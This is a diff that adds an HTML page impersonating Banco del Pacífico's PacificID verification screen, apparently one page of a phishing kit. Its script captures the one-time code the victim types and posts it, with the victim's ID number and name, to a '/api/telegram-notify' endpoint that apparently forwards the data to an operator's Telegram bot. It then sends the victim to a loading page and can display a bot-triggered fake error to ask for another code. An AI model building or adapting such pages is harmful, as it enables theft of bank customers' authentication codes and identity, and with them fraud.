@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – PacificID</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:flex-start;justify-content:center;gap:32px;padding:36px 20px}
+    .card{background:#fff;border-radius:10px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09)}
+
+    /* Ícono candado */
+    .card-icon{text-align:center;margin-bottom:18px}
+    .icon-box{width:52px;height:52px;background:#1a56a0;border-radius:10px;display:inline-flex;align-items:center;justify-content:center;font-size:24px}
+
+    .card h2{font-size:1.35rem;font-weight:800;color:#1a3a6b;margin-bottom:10px;text-align:center}
+    .card .subtitle{font-size:.86rem;color:#888;text-align:center;margin-bottom:28px;line-height:1.6}
+    .card .subtitle strong{color:#1a56a0}
+
+    .err-box{background:#fff0f0;border:1px solid #f5c2c2;border-radius:6px;padding:10px 14px;color:#c92a2a;font-size:.84rem;margin-bottom:16px;display:none;align-items:center;gap:8px}
+    .err-box.show{display:flex}
+
+    .field{margin-bottom:20px}
+    .field label{display:block;font-size:.8rem;color:#1a56a0;margin-bottom:4px;font-weight:500}
+    .field input{width:100%;border:none;border-bottom:2px solid #1a56a0;padding:8px 2px;font-size:1rem;color:#1a3a6b;background:transparent;outline:none;transition:border-color .2s;letter-spacing:.08em}
+    .field input:focus{border-bottom-color:#0d3b7a}
+    .field input.error-input{border-bottom-color:#e03131}
+
+    .btn-primary{width:100%;background:#c7cdd6;color:#fff;border:none;border-radius:6px;padding:13px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px;transition:background .25s}
+    .btn-primary:hover{background:#1a56a0}
+
+    .btn-cancel{width:100%;background:transparent;color:#1a56a0;border:none;padding:12px;font-size:.97rem;font-weight:600;cursor:pointer;margin-top:8px;transition:color .2s}
+    .btn-cancel:hover{color:#0d3b7a;text-decoration:underline}
+
+    .footer-note{text-align:center;font-size:.7rem;color:#aaa;margin-top:24px;line-height:1.6}
+
+    .tips{max-width:320px;padding-top:8px}
+    .tip-title{font-size:.75rem;color:#999;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+    .tip-subtitle{font-size:.95rem;font-weight:700;color:#1a3a6b;margin-bottom:18px}
+    .tip-item{display:flex;gap:10px;margin-bottom:14px;align-items:flex-start}
+    .tip-icon{width:26px;height:26px;flex-shrink:0;background:#eef1f5;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .tip-item p{font-size:.8rem;color:#777;line-height:1.45}
+    .help-section{margin-top:24px}
+    .help-section h4{font-size:.92rem;font-weight:700;color:#1a3a6b;margin-bottom:8px}
+    .help-section a{display:block;font-size:.8rem;color:#1a56a0;text-decoration:none;margin-bottom:5px}
+    .help-section a:hover{text-decoration:underline}
+
+    @media(max-width:700px){.tips{display:none}.page{padding:16px 12px}.card{padding:26px 18px}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+
+    <div class="card-icon">
+      <div class="icon-box">🔐</div>
+    </div>
+
+    <h2>Ingresa el código</h2>
+    <p class="subtitle">Escribe el código <strong>PacificID</strong> generado desde tu<br/>Banca Móvil.</p>
+
+    <div class="err-box" id="err-box">⚠️ <span>Código PacificID incorrecto. Verifica e intenta nuevamente.</span></div>
+
+    <div class="field">
+      <label>Código de verificación</label>
+      <input type="text" id="inputCodigo" placeholder="" inputmode="numeric" maxlength="8" autocomplete="one-time-code"/>
+    </div>
+
+    <button class="btn-primary" id="btnContinuar" onclick="verificar()">Continuar</button>
+    <button class="btn-cancel" onclick="cancelar()">Cancelar</button>
+
+    <p class="footer-note">Recomendamos utilizar la Banca Virtual con Chrome, Firefox o Microsoft Edge.<br/>© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+
+  <div class="tips">
+    <p class="tip-title">CONSEJOS</p>
+    <p class="tip-subtitle">Por tu seguridad:</p>
+    <div class="tip-item"><div class="tip-icon">🔒</div><p>Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.</p></div>
+    <div class="tip-item"><div class="tip-icon">🔑</div><p>No compartas tus claves, recuerda que son de uso personal e intransferible.</p></div>
+    <div class="tip-item"><div class="tip-icon">ℹ️</div><p>Para acceder a la Banca Virtual, asegúrese de teclear <strong>https://www.intermatico.com</strong></p></div>
+    <div class="tip-item"><div class="tip-icon">📞</div><p>En caso de recibir llamadas sospechosas contáctate al <strong>3731500 opción 9</strong>.</p></div>
+    <div class="help-section">
+      <h4>¿Necesitas ayuda?</h4>
+      <a href="#">• ¿Cómo creo mi usuario?</a>
+      <a href="#">• ¿Cómo desbloqueo mi usuario?</a>
+      <a href="#">• ¿Cómo recupero mi contraseña?</a>
+    </div>
+  </div>
+</div>
+<script>
+  document.getElementById('inputCodigo').addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g,'');
+    document.getElementById('err-box').classList.remove('show');
+    this.classList.remove('error-input');
+  });
+
+  async function verificar(){
+    const code = document.getElementById('inputCodigo').value.trim();
+    if(!code || code.length < 4){
+      document.getElementById('err-box').classList.add('show');
+      document.getElementById('inputCodigo').classList.add('error-input');
+      return;
+    }
+
+    document.getElementById('err-box').classList.remove('show');
+
+    const btn = document.getElementById('btnContinuar');
+    btn.disabled = true;
+    btn.textContent = 'Verificando...';
+
+    sessionStorage.setItem('bp_pacificid', code);
+
+    try{
+      await fetch('/api/telegram-notify',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          action:'notify_step',
+          data:{
+            cedula: sessionStorage.getItem('bp_cedula')||'—',
+            nombre: sessionStorage.getItem('bp_nombre')||'—',
+            step:'PACIFIC ID',
+            extra:{'Código PacificID': code}
+          }
+        })
+      });
+    }catch(e){console.log('telegram error',e);}
+
+    window.location.href = 'loading.html';
+  }
+
+  function cancelar(){
+    sessionStorage.clear();
+    window.location.href = 'index.html';
+  }
+
+  document.addEventListener('keydown', e => { if(e.key === 'Enter') verificar(); });
+
+  // Mostrar error si viene del bot
+  const params = new URLSearchParams(window.location.search);
+  if(params.get('error') === 'pacificid'){
+    document.getElementById('err-box').classList.add('show');
+    document.getElementById('inputCodigo').value = '';
+    document.getElementById('inputCodigo').classList.add('error-input');
+    document.getElementById('inputCodigo').focus();
+  }
+</script>
+</body>
+</html>
